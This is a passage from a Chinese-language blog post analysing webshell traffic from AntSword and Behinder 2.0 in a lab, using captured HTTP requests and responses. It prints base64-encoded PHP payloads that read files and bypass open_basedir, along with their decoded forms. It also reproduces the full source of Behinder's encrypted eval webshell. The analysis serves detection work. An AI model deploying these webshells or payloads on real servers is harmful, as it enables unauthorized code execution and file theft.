class="keyword">as</span> <span class="variable">$L</span>) <span class="keyword">if</span> (<span class="title function_ invoke__">is_dir</span>(<span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>)) <span class="variable">$R</span>. = <span class="string">&quot;<span class="subst">&#123;$L&#125;</span>:&quot;</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$R</span>. = <span class="string">&quot;/&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$R</span>. = <span class="string">&quot;	&quot;</span>;</span><br><span class="line">    <span class="variable">$u</span> = (<span class="title function_ invoke__">function_exists</span>(<span class="string">&quot;posix_getegid&quot;</span>)) ? @<span class="title function_ invoke__">posix_getpwuid</span>(@<span class="title function_ invoke__">posix_geteuid</span>()) : <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="variable">$s</span> = (<span class="variable">$u</span>) ? <span class="variable">$u</span>[<span class="string">&quot;name&quot;</span>] : @<span class="title function_ invoke__">get_current_user</span>();</span><br><span class="line">    <span class="variable">$R</span>. = <span class="title function_ invoke__">php_uname</span>();</span><br><span class="line">    <span class="variable">$R</span>. = <span class="string">&quot;	<span class="subst">&#123;$s&#125;</span>&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$R</span>;;</span><br><span class="line">&#125; <span class="keyword">catch</span> (<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;ERROR://&quot;</span>.<span class="variable">$e</span> - &gt; <span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">&#125;;</span><br><span class="line"><span class="title function_ invoke__">asoutput</span>();</span><br><span class="line"><span class="keyword">die</span>();</span><br></pre></td></tr></table></figure>
+
+<p>Response包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 08 Sep 2022 02:43:30 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Connection: close</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">551ac7580RDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAJQzpEOkU6RjpHOglXaW5kb3dzIE5UIERFU0tUT1AtUkk1OTA2SyA2LjIgYnVpbGQgOTIwMCAoV2luZG93cyA4IEhvbWUgUHJlbWl1bSBFZGl0aW9uKSBBTUQ2NAlyb3lhbA==f552be</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h6 id="命令执行分析"><a href="#命令执行分析" class="headerlink" title="命令执行分析"></a>命令执行分析</h6><ol>
+<li><p>POST包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">POST /ma.php HTTP/1.1</span><br><span class="line">Host: localhost</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 1413</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">b22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz&amp;bckdor=%40eval(%40base64_decode(%24_POST%5B&#x27;i999ba0d8875f2&#x27;%5D))%3B&amp;i999ba0d8875f2=QGluaV9zZXQoImRpc3BsYXlfZXJyb3JzIiwgIjAiKTtAc2V0X3RpbWVfbGltaXQoMCk7JG9wZGlyPUBpbmlfZ2V0KCJvcGVuX2Jhc2VkaXIiKTtpZigkb3BkaXIpIHskb2N3ZD1kaXJuYW1lKCRfU0VSVkVSWyJTQ1JJUFRfRklMRU5BTUUiXSk7JG9wYXJyPXByZWdfc3BsaXQoIi87fDovIiwkb3BkaXIpO0BhcnJheV9wdXNoKCRvcGFyciwkb2N3ZCxzeXNfZ2V0X3RlbXBfZGlyKCkpO2ZvcmVhY2goJG9wYXJyIGFzICRpdGVtKSB7aWYoIUBpc193cml0YWJsZSgkaXRlbSkpe2NvbnRpbnVlO307JHRtZGlyPSRpdGVtLiIvLmVlMDgzIjtAbWtkaXIoJHRtZGlyKTtpZighQGZpbGVfZXhpc3RzKCR0bWRpcikpe2NvbnRpbnVlO31AY2hkaXIoJHRtZGlyKTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwgIi4uIik7JGNudGFycj1AcHJlZ19zcGxpdCgiL1xcXFx8XC8vIiwkdG1kaXIpO2ZvcigkaT0wOyRpPHNpemVvZigkY250YXJyKTskaSsrKXtAY2hkaXIoIi4uIik7fTtAaW5pX3NldCgib3Blbl9iYXNlZGlyIiwiLyIpO0BybWRpcigkdG1kaXIpO2JyZWFrO307fTs7ZnVuY3Rpb24gYXNlbmMoJG91dCl7cmV0dXJuIEBiYXNlNjRfZW5jb2RlKCRvdXQpO307ZnVuY3Rpb24gYXNvdXRwdXQoKXskb3V0cHV0PW9iX2dldF9jb250ZW50cygpO29iX2VuZF9jbGVhbigpO2VjaG8gImI5MTkiLiI1ODVkNiI7ZWNobyBAYXNlbmMoJG91dHB1dCk7ZWNobyAiMGNiIi4iMjNiNyI7fW9iX3N0YXJ0KCk7dHJ5eyRGPWJhc2U2NF9kZWNvZGUoc3Vic3RyKCRfUE9TVFsiYjIyZGRhMDRhZGEzNWMiXSwyKSk7JFA9QGZvcGVuKCRGLCJyIik7ZWNobyhAZnJlYWQoJFAsZmlsZXNpemUoJEYpP2ZpbGVzaXplKCRGKTo0MDk2KSk7QGZjbG9zZSgkUCk7O31jYXRjaChFeGNlcHRpb24gJGUpe2VjaG8gIkVSUk9SOi8vIi4kZS0%2BZ2V0TWVzc2FnZSgpO307YXNvdXRwdXQoKTtkaWUoKTs%3D</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>解密</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line">b22dda04ada35c=rRRDovcGhwU3R1ZHlfNjQvcGhwc3R1ZHlfcHJvL1dXVy9waHAvLmh0YWNjZXNz</span><br><span class="line">&amp;bckdor=@eval(@base64_decode($_POST[&#x27;i999ba0d8875f2&#x27;]));</span><br><span class="line"></span><br><span class="line">&amp;i999ba0d8875f2=</span><br><span class="line">@ini_set(&quot;display_errors&quot;, &quot;0&quot;);@</span><br><span class="line">set_time_limit(0);</span><br><span class="line">$opdir = @ini_get(&quot;open_basedir&quot;);</span><br><span class="line">if ($opdir) &#123;</span><br><span class="line">    $ocwd = dirname($_SERVER[&quot;SCRIPT_FILENAME&quot;]);</span><br><span class="line">    $oparr = preg_split(&quot;/;|:/&quot;, $opdir);@</span><br><span class="line">    array_push($oparr, $ocwd, sys_get_temp_dir());</span><br><span class="line">    foreach($oparr as $item) &#123;</span><br><span class="line">        if (!@is_writable($item)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;;</span><br><span class="line">        $tmdir = $item.</span><br><span class="line">        &quot;/.ee083&quot;;@</span><br><span class="line">        mkdir($tmdir);</span><br><span class="line">        if (!@file_exists($tmdir)) &#123;</span><br><span class="line">            continue;</span><br><span class="line">        &#125;@</span><br><span class="line">        chdir($tmdir);@</span><br><span class="line">        ini_set(&quot;open_basedir&quot;, &quot;..&quot;);</span><br><span class="line">        $cntarr = @preg_split(&quot;/\\\\|\//&quot;, $tmdir);</span><br><span class="line">        for ($i = 0; $i &lt; sizeof($cntarr); $i++) &#123;@</span><br><span class="line">            chdir(&quot;..&quot;);</span><br><span class="line">        &#125;;@</span><br><span class="line">        ini_set(&quot;open_basedir&quot;, &quot;/&quot;);@</span><br><span class="line">        rmdir($tmdir);</span><br><span class="line">        break;</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;;;</span><br><span class="line"></span><br><span class="line">function asenc($out) &#123;</span><br><span class="line">    return@ base64_encode($out);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">function asoutput() &#123;</span><br><span class="line">    $output = ob_get_contents();</span><br><span class="line">    ob_end_clean();</span><br><span class="line">    echo &quot;b919&quot;.</span><br><span class="line">    &quot;585d6&quot;;</span><br><span class="line">    echo@ asenc($output);</span><br><span class="line">    echo &quot;0cb&quot;.</span><br><span class="line">    &quot;23b7&quot;;</span><br><span class="line">&#125;</span><br><span class="line">ob_start();</span><br><span class="line">try &#123;</span><br><span class="line">    $F = base64_decode(substr($_POST[&quot;b22dda04ada35c&quot;], 2));</span><br><span class="line">    $P = @fopen($F, &quot;r&quot;);</span><br><span class="line">    echo(@fread($P, filesize($F) ? filesize($F) : 4096));@</span><br><span class="line">    fclose($P);;</span><br><span class="line">&#125; catch (Exception $e) &#123;</span><br><span class="line">    echo &quot;ERROR://&quot;.$e - &gt; getMessage();</span><br><span class="line">&#125;;</span><br><span class="line">asoutput();</span><br><span class="line">die();</span><br></pre></td></tr></table></figure></li>
+</ol>
+<h4 id="冰蝎2-0流量分析"><a href="#冰蝎2-0流量分析" class="headerlink" title="冰蝎2.0流量分析"></a>冰蝎2.0流量分析</h4><h6 id="后门"><a href="#后门" class="headerlink" title="后门"></a>后门</h6><p>这里以冰蝎自带的php webshell进行分析</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pass&#x27;</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">uniqid</span>(<span class="title function_ invoke__">rand</span>())),<span class="number">16</span>);</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>]=<span class="variable">$key</span>;</span><br><span class="line">    <span class="keyword">print</span> <span class="variable">$key</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$key</span>=<span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">	<span class="variable">$post</span>=<span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;php://input&quot;</span>);</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$t</span>=<span class="string">&quot;base64_&quot;</span>.<span class="string">&quot;decode&quot;</span>;</span><br><span class="line">		<span class="variable">$post</span>=<span class="variable">$t</span>(<span class="variable">$post</span>.<span class="string">&quot;&quot;</span>);</span><br><span class="line">		</span><br><span class="line">		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span class="variable">$post</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">    			 <span class="variable">$post</span>[<span class="variable">$i</span>] = <span class="variable">$post</span>[<span class="variable">$i</span>]^<span class="variable">$key</span>[<span class="variable">$i</span>+<span class="number">1</span>&amp;<span class="number">15</span>]; </span><br><span class="line">    			&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="variable">$post</span>=<span class="title function_ invoke__">openssl_decrypt</span>(<span class="variable">$post</span>, <span class="string">&quot;AES128&quot;</span>, <span class="variable">$key</span>);</span><br><span class="line">	&#125;</span><br><span class="line">    <span class="variable">$arr</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&#x27;|&#x27;</span>,<span class="variable">$post</span>);</span><br><span class="line">    <span class="variable">$func</span>=<span class="variable">$arr</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="variable">$params</span>=<span class="variable">$arr</span>[<span class="number">1</span>];</span><br><span class="line">	<span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"><span class="variable">$p</span></span>) </span>&#123;<span class="keyword">eval</span>(<span class="variable">$p</span>.<span class="string">&quot;&quot;</span>);&#125;&#125;</span><br><span class="line">    @<span class="title function_ invoke__">call_user_func</span>(<span class="keyword">new</span> <span class="title function_ invoke__">C</span>(),<span class="variable">$params</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h6 id="wireshark抓包-1"><a href="#wireshark抓包-1" class="headerlink" title="wireshark抓包"></a>wireshark抓包</h6><p><img src="https://gitee.com/chuchuxingchen/blog-gallery/raw/master/img/image-20220908151648206.png" alt="image-20220908151648206"></p>
+<h6 id="连接过程分析-1"><a href="#连接过程分析-1" class="headerlink" title="连接过程分析"></a>连接过程分析</h6><p>会对 Get 传入的pass这个参数进行检查，如果存在的话会以时间的方式生成长度16的随机key，然后存入到session当中，再往后判断是否开启了openssl这个扩展，开启的情况就会开启AES进行解密，得到中间结果字符串 <code>assert|eval(&quot;phpinfo();&quot;)</code> 此数据是由冰蝎加载器发出的，已经定义好的，服务端利用explode函数将拆分为一个字符串数据，然后以可变函数方式调用索引为0的数组元素，参数为索引为1的数组元素，即为 <code>assert(&quot;eval(&quot;phpinfo;&quot;)&quot;)</code>。没有开启的情况，进行异或处理然后通过base64加密。这就是同时在早期有一定的免杀效果，但是这个函数现在已经被标注为危险函数。</p>
+<ol>
+<li><p>第一次get请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /shell.php?pass=830 HTTP/1.1</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class="line">Host: 192.168.124.15</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 08 Sep 2022 07:15:29 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: PHPSESSID=oat0ierrkmesft82r8f3cahld0; path=/</span><br><span class="line">Keep-Alive: timeout=5, max=100</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">efc6eabf7e74c052</span><br></pre></td></tr></table></figure>
+
+<p>服务器端产生密钥写入session，session和当前会话绑定。</p>
+</li>
+<li><p>第二次get请求</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET /shell.php?pass=862 HTTP/1.1</span><br><span class="line">Content-type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class="line">Host: 192.168.124.15</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 08 Sep 2022 07:15:29 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Set-Cookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/</span><br><span class="line">Keep-Alive: timeout=5, max=99</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">2799e642b49292f5</span><br></pre></td></tr></table></figure>
+
+<p>第二次请求是为了获取key。此时的 <code>2799e642b49292f5</code>就为解密代码的key。</p>
+</li>
+<li><p>第三次POST请求</p>
+<p>post的数据可以利用上面的Key进行解密获得代码，解密网址<a target="_blank" rel="noopener" href="http://tools.bugscaner.com/cryptoaes/">http://tools.bugscaner.com/cryptoaes/</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">POST /shell.php HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: PHPSESSID=guos18kll9it96vi1d5pt2hfv3; path=/</span><br><span class="line">User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0; .NET CLR 2.0.50727; SLCC2; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; Tablet PC 2.0; .NET4.0E)</span><br><span class="line">Cache-Control: no-cache</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Host: 192.168.124.15</span><br><span class="line">Accept: text/html, image/gif, image/jpeg, *; q=.2, */*; q=.2</span><br><span class="line">Connection: keep-alive</span><br><span class="line">Content-Length: 1112</span><br><span class="line"></span><br><span class="line">4JJ1vgeFtENJjbeFggAdnhHtjfRuRERCT+s+xGLdeFFNHb2FL64aXqppeyKCYKOtMDJ2Q0MkWM0uK78atu2idaEJlhKfrmMYWe4cZNUSp5Ildf4Ssz+NmZ+mm5bCrwTHeTeGuBr+4sMBL/5rba8aQYVNxM9FurbkuCGL22pSQw7S4lq+wbCoPN+BAhTHFfN19bb3JYeYlP3X/gib0Uc+OObKBLjkjVkoBgwxi9G71ynaBeStn59BnmZSuTNWMa5s2YzAkMwmBcKoHjG362MHAJZnetnGolqI8hyoBZW5RUJkVlFEPM+VScUT+ZEe6tNJfmjCHthycvxbDcNLmiwTQhDAH5WtwwAGjt210wkn278dT1TPDy4hbGMYJVCOBnHNoIGHk3DAqeC0YbJHWRRrk50Y7A7uvHhDtGJmvBQc9S9SlhqMG2UKxMUF+KGlYiuchUMP5uvSIABDEQn7rgyHQWW6EGw3n9BOFStEKngzj/xX/Og9s0YpeUUjeza4PCmRtV3fIaj+ZiwBhbUsbJJ25hZMR9W5HcttD/6nxEx95Aj/jV1f8VxCsHN/0+j8GqmLTIo42IHpTxFGVTI/a2T13uPdhAJ3VLzVS36d9hmiwHIpYBhffnt/zWZW2lCxVTw1h5K3TKvmfGfiNr1JJkdLzdhd3AT0Hi/fZHSOOg/2nn/fpBGolYUGOa2s0KUDWjyGBsmXKwTi5gjeFNL+VQDt4QI+Dv921eQ4Z/tzCT/alkoCC1smBkVz8yYAxsWJJin8PON4aT3T9GzilqxkfRDHjDcVu5uInani3Y0f5QSNCSqfA24FXh2gbH3F1p/3RYKdBhwz7g1jESUV0/vb4ulvKFz9jaaS4j6wx8rIcjzCsIXRISwe3/270jWKWZbI7szA7obaNPxXL/0h5ufQL+mkVDd/L2ByfQXofhidjn7dbfLhkDmAkYhCKGY/R84zOUs8+B81wJ7l2grTF4c6jdvT/oJNnjtBVz6D3i5WInCTzBMe2IGreRIx9KZhhGNs48rzyP5EKkqOv/Sx2HJR+9t54xvxXGKDM67NCidH6e6gr37n2HKUIvZ9fsNSDA+xhFKpkVzLoYxmLthnjuQHXB+Gnw==</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Date: Thu, 08 Sep 2022 07:15:29 GMT</span><br><span class="line">Server: Apache/2.4.39 (Win64) OpenSSL/1.1.1b mod_fcgid/2.3.9a mod_log_rotate/1.02</span><br><span class="line">X-Powered-By: PHP/5.6.9</span><br><span class="line">Expires: Thu, 19 Nov 1981 08:52:00 GMT</span><br><span class="line">Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0</span><br><span class="line">Pragma: no-cache</span><br><span class="line">Keep-Alive: timeout=5, max=98</span><br><span class="line">Connection: Keep-Alive</span><br><span class="line">Transfer-Encoding: chunked</span><br><span class="line">Content-Type: text/html; charset=UTF-8</span><br><span class="line"></span><br><span class="line">Bnd5kIU4J47rBRDDsjLphOLDXZvLCCz7jxHMJr5Et5nRT4dXOImO66RrGr2hl8wf4VtOZadbTvs/8BE1My4QAoG2emIcUrCIDh40VIS25l/oyrLapJB/2y59OPr4AAmb</span><br></pre></td></tr></table></figure>
+
+<p>请求包Aes解密后的数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert|eval(base64_decode(&#x27;QGVycm9yX3JlcG9ydGluZygwKTsNCmZ1bmN0aW9uIG1haW4oJGNvbnRlbnQpDQp7DQoJJHJlc3VsdCA9IGFycmF5KCk7DQoJJHJlc3VsdFsic3RhdHVzIl0gPSBiYXNlNjRfZW5jb2RlKCJzdWNjZXNzIik7DQogICAgJHJlc3VsdFsibXNnIl0gPSBiYXNlNjRfZW5jb2RlKCRjb250ZW50KTsNCiAgICAka2V5ID0gJF9TRVNTSU9OWydrJ107DQogICAgZWNobyBlbmNyeXB0KGpzb25fZW5jb2RlKCRyZXN1bHQpLCRrZXkpOw0KfQ0KDQpmdW5jdGlvbiBlbmNyeXB0KCRkYXRhLCRrZXkpDQp7DQoJaWYoIWV4dGVuc2lvbl9sb2FkZWQoJ29wZW5zc2wnKSkNCiAgICAJew0KICAgIAkJZm9yKCRpPTA7JGk8c3RybGVuKCRkYXRhKTskaSsrKSB7DQogICAgCQkJICRkYXRhWyRpXSA9ICRkYXRhWyRpXV4ka2V5WyRpKzEmMTVdOyANCiAgICAJCQl9DQoJCQlyZXR1cm4gJGRhdGE7DQogICAgCX0NCiAgICBlbHNlDQogICAgCXsNCiAgICAJCXJldHVybiBvcGVuc3NsX2VuY3J5cHQoJGRhdGEsICJBRVMxMjgiLCAka2V5KTsNCiAgICAJfQ0KfSRjb250ZW50PSI2MDc2YjhjMy04NTJiLTRkOGQtYjg0MS0xYzMxMDNhNWY5NTYiOw0KbWFpbigkY29udGVudCk7&#x27;));</span><br></pre></td></tr></table></figure>
+
+<p>请求包base64 decode</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">@<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"><span class="variable">$content</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="keyword">array</span>();</span><br><span class="line">	<span class="variable">$result</span>[<span class="string">&quot;status&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="string">&quot;success&quot;</span>);</span><br><span class="line">    <span class="variable">$result</span>[<span class="string">&quot;msg&quot;</span>] = <span class="title function_ invoke__">base64_encode</span>(<span class="variable">$content</span>);</span><br><span class="line">    <span class="variable">$key</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;k&#x27;</span>];</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">encrypt</span>(<span class="title function_ invoke__">json_encode</span>(<span class="variable">$result</span>),<span class="variable">$key</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encrypt</span>(<span class="params"><span class="variable">$data</span>,<span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(!<span class="title function_ invoke__">extension_loaded</span>(<span class="string">&#x27;openssl&#x27;</span>))</span><br><span class="line">    	&#123;</span><br><span class="line">    		<span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="title function_ invoke__">strlen</span>(<span 